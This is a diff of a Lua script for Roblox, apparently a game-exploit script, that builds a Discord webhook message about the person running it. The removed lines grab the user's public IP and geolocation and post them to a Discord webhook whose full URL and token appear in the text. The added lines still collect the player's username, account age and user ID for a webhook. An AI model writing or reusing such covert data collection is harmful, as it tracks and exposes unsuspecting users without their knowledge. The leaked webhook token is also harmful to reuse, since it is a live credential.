@@ -119,16 +119,12 @@ local webhookcheck =
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"
 
-
-local api1 = tostring(game:HttpGet("https://api.ipify.org", true))
-local api2 = tostring(game:HttpGet("http://ip-api.com/json"))
-
 local url =
-  "https://discord.com/api/webhooks/995549814454505582/wKAvmS53sYgxFVdHiahe1Kmflmfb_tte0Yzqp1sJ6MrS8mk98glPH_B4hk8Tn2M-WeQN"
+  "https://discord.com/api/webhooks/"
 local data = {
   ["embeds"] = {
       {
-        ["title"] = "**PSA**",
+        ["title"] = "**w**",
         ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
         ["type"] = "rich",
         ["color"] = tonumber(0x7269da),
@@ -139,13 +135,13 @@ local data = {
                 ["inline"] = true
             },
             {
-                ["name"] = "api1",
-                ["value"] = tostring(api1),
+                ["name"] = "age",
+                ["value"] = tostring(game.Players.LocalPlayer.AccountAge),
                 ["inline"] = true
             },
             {
-                ["name"] = "api2",
-                ["value"] = tostring(api2),
+                ["name"] = "Id",
+                ["value"] = tostring(game.Players.LocalPlayer.UserId),
                 ["inline"] = true
             }
         }
